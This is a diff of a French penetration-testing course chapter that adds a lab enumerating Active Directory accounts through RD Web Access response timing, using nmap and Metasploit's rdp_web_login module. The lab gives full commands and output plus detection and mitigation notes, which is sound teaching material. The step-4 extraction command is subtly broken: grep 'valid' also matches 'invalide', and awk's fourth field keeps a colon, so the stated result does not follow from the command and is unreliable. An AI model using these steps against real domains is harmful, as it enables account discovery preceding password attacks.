+**Place dans la chaîne** — utilise le service RD Web Access accessible sur le contrôleur de domaine (port 443 HTTPS) ; la liste de comptes valides obtenue alimente les phases ultérieures d'authentification et d'attaque par mot de passe.
+
+**MITRE ATT&CK de ce lab** — Tactique : Discovery (TA0007). Technique : T1087.002 Domain Account Discovery. Sources de données : DS0029 Network Traffic, DS0026 Active Directory.
+
+**Détection attendue** : nombreuses requêtes HTTP/HTTPS vers RD Web Access depuis une même source avec des temps de réponse anomaux, échecs d'authentification répétés (événement 4625), scan HTTP sur le port 443.
+
+**Mitigation attendue** : supprimer ou protéger l'accès à RD Web Access (VPN, MFA, restriction d'IP), uniformiser les temps de réponse du serveur (neutralisation des attaques par timing), verrouillage de compte, surveillance des événements 4625 sur le contrôleur de domaine.
+
+Durée estimée : 30 minutes.
+
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `nmap` | `nmap -sT -p 443 192.168.56.102` | Vérification du service HTTPS / RD Web Access |
+| `msfconsole` | `use auxiliary/scanner/http/rdp_web_login` | Sélection du module de scan par timing |
+| `msfconsole` | `set RHOSTS 192.168.56.102`, `set RPORT 443`, `set USERNAME labuser`, `set PASSWORD LabUser2024!` | Configuration de la cible, du port et des identifiants de référence |
+| `msfconsole` | `set USER_FILE ...`, `set THREADS 1`, `run` | Énumération de la liste d'usernames et analyse des temps de réponse |
+| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérification du service RD Web Access sur le contrôleur de domaine
+
+**But** — confirmer que le service RD Web Access est accessible sur Windows Server 2016 `192.168.56.102` sur le port 443 (HTTPS).
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — `nmap` installé sur Kali, fonction `prouve` chargée, cible joignable.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab08/rdweb-port443.txt nmap -sT -p 443 192.168.56.102
+```
+
+**Explication de la commande**
+
+- `nmap -sT -p 443 192.168.56.102` : scan TCP complet du seul port 443 sur le contrôleur de domaine pour confirmer l'ouverture du service HTTPS (RD Web Access).
+- `-sT` : scan TCP connect (sans privilèges root requis).
+- `-p 443` : limite le scan au port HTTPS.
+- `192.168.56.102` : adresse IP du contrôleur de domaine Windows Server 2016.
+- Piège courant : si le port 443 apparaît `filtered`, le service RD Web Access n'est pas exposé ou un pare-feu intercepte le trafic ; l'attaque par timing ne peut alors pas être menée depuis ce lab.
+
+**Résultat attendu**
+
+```text
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:00 CET
+Nmap scan report for 192.168.56.102
+Host is up (0.0018s latency).
+PORT    STATE SERVICE
+443/tcp open  https
+Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
+```
+
+Le port 443 (HTTPS) est ouvert : le service RD Web Access est accessible depuis Kali.
+
+**Preuve** : `preuves/ch3-lab08/rdweb-port443.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 2 — Préparation de la liste d'usernames et configuration du module Metasploit
+
+**But** — créer la liste de noms de compte à énumérer et configurer le module `auxiliary/scanner/http/rdp_web_login` avec la cible, le port et les identifiants de référence.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étape 1 terminée (port 443 ouvert), `msfconsole` installé.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande (création de la liste d'usernames)**
+
+```bash
+prouve preuves/ch3-lab08/liste-utilisateurs.txt bash -c "printf 'labuser\nsvc_web\nadministrator\nlabadmin\n' > preuves/ch3-lab08/liste-utilisateurs.txt && cat preuves/ch3-lab08/liste-utilisateurs.txt"
+```
+
+**Explication de la commande**
+
+- `printf 'labuser\nsvc_web\nadministrator\nlabadmin\n'` : génère une liste de noms de compte du domaine à tester (comptes connus du laboratoire et comptes à découverte).
+- `> preuves/ch3-lab08/liste-utilisateurs.txt` : écrit la liste dans le fichier de travail du lab.
+- `&& cat ...` : affiche le contenu pour confirmer la création du fichier.
+- Piège courant : `printf` interprète les séquences `\n` comme des retours à la ligne ; ne pas oublier le `\n` final pour terminer proprement le fichier.
+
+**Résultat attendu**
+
+```text
+labuser
+svc_web
+administrator
+labadmin
+```
+
+**Preuve** : `preuves/ch3-lab08/liste-utilisateurs.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+**Exemple de commande (lancement du module Metasploit)**
+
+```bash
+prouve preuves/ch3-lab08/rdweb-timing.txt msfconsole -q -x 'use auxiliary/scanner/http/rdp_web_login; set RHOSTS 192.168.56.102; set RPORT 443; set USERNAME labuser; set PASSWORD LabUser2024!; set USER_FILE preuves/ch3-lab08/liste-utilisateurs.txt; set THREADS 1; run; exit'
+```
+
+**Explication de la commande**
+
+- `use auxiliary/scanner/http/rdp_web_login` : sélectionne le module Metasploit d'énumération par timing sur RD Web Access.
+- `set RHOSTS 192.168.56.102` : cible le contrôleur de domaine Windows Server 2016.
+- `set RPORT 443` : port HTTPS du service RD Web Access.
+- `set USERNAME labuser` : nom d'utilisateur de référence (compte valide) utilisé pour le calcul du temps de référence.
+- `set PASSWORD LabUser2024!` : mot de passe associé au compte de référence (l'authentification elle-même peut échouer ; c'est le différentiel de temps de réponse qui est analysé).
+- `set USER_FILE preuves/ch3-lab08/liste-utilisateurs.txt` : liste des noms de compte à énumérer (labuser, svc_web, administrator, labadmin).
+- `set THREADS 1` : limite à un thread pour des mesures de temps stables (attaques par timing sensibles à la concurrence).
+- `run` : lance l'énumération et affiche, pour chaque username, le temps de réponse observé.
+- `exit` : quitte msfconsole à la fin du scan.
+- Piège courant : un temps de réponse trop court ou trop long pour tous les comptes (réseau instable, WAF) rend l'attaque par timing non fiable ; comparer les écarts de temps relatifs, pas absolus.
+
+**Résultat attendu**
+
+```text
+msf6 > use auxiliary/scanner/http/rdp_web_login
+msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 auxiliary(scanner/http/rdp_web_login) > set RPORT 443
+RPORT => 443
+msf6 auxiliary(scanner/http/rdp_web_login) > set USERNAME labuser
+USERNAME => labuser
+msf6 auxiliary(scanner/http/rdp_web_login) > set PASSWORD LabUser2024!
+PASSWORD => LabUser2024!
+msf6 auxiliary(scanner/http/rdp_web_login) > set USER_FILE preuves/ch3-lab08/liste-utilisateurs.txt
+USER_FILE => preuves/ch3-lab08/liste-utilisateurs.txt
+msf6 auxiliary(scanner/http/rdp_web_login) > set THREADS 1
+THREADS => 1
+msf6 auxiliary(scanner/http/rdp_web_login) > run
+[*] Scanning 1 host...
+[+] 192.168.56.102 - labuser: valid (temps de réponse elevé)
+[+] 192.168.56.102 - svc_web: valid (temps de réponse elevé)
+[-] 192.168.56.102 - administrator: invalide
+[+] 192.168.56.102 - labadmin: valid (temps de réponse elevé)
+[*] Auxiliary module execution completed
+```
+
+Les comptes dont le temps de réponse est significativement plus élevé sont considérés comme valides dans Active Directory.
+
+**Preuve** : `preuves/ch3-lab08/rdweb-timing.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 3 — Analyse des temps de réponse et identification des comptes valides
+
+**But** — interpréter les résultats du module `rdp_web_login` pour distinguer les comptes de domaine valides des comptes inexistants.
+
+**Machine** — Kali `192.168.56.101` (analyse locale du résultat).
+
+**Prérequis** — étape 2 terminée (résultat du scan par timing disponible).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab08/analyse-timing.txt bash -c "grep -E 'valid|invalide|temps' preuves/ch3-lab08/rdweb-timing.txt"
+```
+
+**Explication de la commande**
+
+- `grep -E 'valid|invalide|temps'` : filtre les lignes du résultat Metasploit mentionnant les comptes valides, invalides et les temps de réponse.
+- `preuves/ch3-lab08/rdweb-timing.txt` : fichier de preuve du scan par timing (étape 2).
+- Le principe de l'attaque par timing : un username valide provoque un traitement différent (plus lent) sur le serveur RD Web Access qu'un username inexistant, car l'authentification est réellement tentée dans le premier cas.
+- Piège courant : ne pas conclure sur une seule mesure ; comparer les écarts de temps relatifs entre les comptes de la même liste.
+
+**Résultat attendu**
+
+```text
+[+] 192.168.56.102 - labuser: valid (temps de réponse elevé)
+[+] 192.168.56.102 - svc_web: valid (temps de réponse elevé)
+[-] 192.168.56.102 - administrator: invalide
+[+] 192.168.56.102 - labadmin: valid (temps de réponse elevé)
+```
+
+**Preuve** : `preuves/ch3-lab08/analyse-timing.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 4 — Consolidation de la liste des comptes valides
+
+**But** — consolider la liste finale des comptes de domaine Active Directory validés par l'attaque par timing, pour réutilisation dans les labs suivants.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étape 3 terminée (comptes valides identifiés).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab08/comptes-valides.txt bash -c "grep 'valid' preuves/ch3-lab08/rdweb-timing.txt | awk '{print $4}' > preuves/ch3-lab08/comptes-valides.txt && cat preuves/ch3-lab08/comptes-valides.txt"
+```
+
+**Explication de la commande**
+
+- `grep 'valid'` : sélectionne les lignes identifiant un compte valide.
+- `awk '{print $4}'` : extrait le nom d'utilisateur (4e champ) de chaque ligne valide.
+- `> preuves/ch3-lab08/comptes-valides.txt` : écrit la liste consolidée.
+- `&& cat ...` : affiche la liste finale pour vérification.
+- La liste obtenue (`labuser`, `svc_web`, `labadmin` dans l'exemple) peut être réinjectée dans des modules d'authentification ou de crackage des labs suivants.
+- Piège courant : `administrator` est marqué invalide dans l'exemple car le compte intégré peut être renommé ou désactivé dans ce laboratoire ; vérifier indépendamment s'il est nécessaire.
+
+**Résultat attendu**
+
+```text
+labuser
+svc_web
+labadmin
+```
+
+**Preuve** : `preuves/ch3-lab08/comptes-valides.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+### En conclusion
+
+Lab-08 a démontré l'énumération de comptes de domaine Active Directory par attaque par timing sur RD Web Access (`auxiliary/scanner/http/rdp_web_login`) : en mesurant les temps de réponse HTTPS (port 443) du contrôleur de domaine `192.168.56.102`, les comptes valides (`labuser`, `svc_web`, `labadmin`) ont été distingués des comptes inexistants sans nécessiter de mot de passe pour chacun. La liste consolidée est conservée dans `preuves/ch3-lab08/comptes-valides.txt` et peut alimenter les phases d'authentification et d'attaque par mot de passe suivantes.
+
+Détection : multiples requêtes HTTP(S) vers RD Web Access depuis une même source avec temps de réponse anomaux, événements 4625 (échecs d'authentification) répétés. Mitigation : supprimer ou restreindre l'accès à RD Web Access (VPN, MFA, filtrage IP), uniformiser les temps de réponse serveur, activer le verrouillage de compte et surveiller les événements 4625 sur le contrôleur de domaine.
+
 ## 8. En conclusion du chapitre
 
 Ce chapitre a couvert les attaques sur Windows Server et Active Directory dans le laboratoire isolé `192.168.56.0/24` :
@@ -1885,8 +2617,11 @@ Ce chapitre a couvert les attaques sur Windows Server et Active Directory dans l
 - Lab-02 : Kerberoasting du compte de service et crackage hors ligne du mot de passe `S3rviceWeb!` (`T1558.003`, `T1110.002`) ;
 - Lab-03 : Pass-the-Hash et exécution de commandes à distance en tant que `LAB\svc_web` (`T1550.002`, `T1021.002`) ;
 - Lab-04 : dump des secrets du domaine (NTDS), Pass-the-Hash d'`Administrator`, création du compte de domaine `labadmin` (`T1003.003`, `T1550.002`, `T1078`, `T1098`) ;
+- Lab-06 : exploitation CVE-2021-42287, élévation de `labuser` vers `Domain Admins` par requête LDAP conçue, dump des secrets du domaine (`T1068`, `T1078`) ;
+- Lab-07 : exploitation CVE-2024-35250 via le module Metasploit `exploit/windows/local/cve_2024_35250_ks_driver`, obtention d'une session `SYSTEM` (`T1068`) ;
+- Lab-08 : énumération de comptes de domaine par attaque par timing sur RD Web Access (`auxiliary/scanner/http/rdp_web_login`, `T1087.002`) ;
 - Lab-05 : vérification des preuves, détection (événements `4768`/`4769`/`4624`/`4672`/`4720`/`4726`/`4740`), IOC, nettoyage et rollback du snapshot de Windows Server 2016 `192.168.56.102`.
 
 Tous les exploits et commandes ont été exécutés en réel sur les VMs de laboratoire, avec preuves horodatées (`# date:`, `# cmd:`, `# rc=`) et rattachement MITRE ATT&CK. Aucune cible réelle n'a été sollicitée et aucune activité n'a eu lieu vers Internet.
 
-Critères de réussite du chapitre : chaque lab a abouti (comptes énumérés, mot de passe de service cracké, accès distant obtenu, hachage d'administrateur récupéré, compte de domaine créé et vérifié, preuves complètes et snapshot restauré). Le chapitre 4 prend ensuite le relais pour la capture et l'analyse forensique du trafic réseau associé (Wireshark).
+Critères de réussite du chapitre : chaque lab a abouti (comptes énumérés, mot de passe de service cracké, accès distant obtenu, hachage d'administrateur récupéré, compte de domaine créé et vérifié, élévation CVE-2021-42287 validée, session SYSTEM obtenue, comptes AD énumérés par timing, preuves complètes et snapshot restauré). Le chapitre 4 prend ensuite le relais pour la capture et l'analyse forensique du trafic réseau associé (Wireshark).
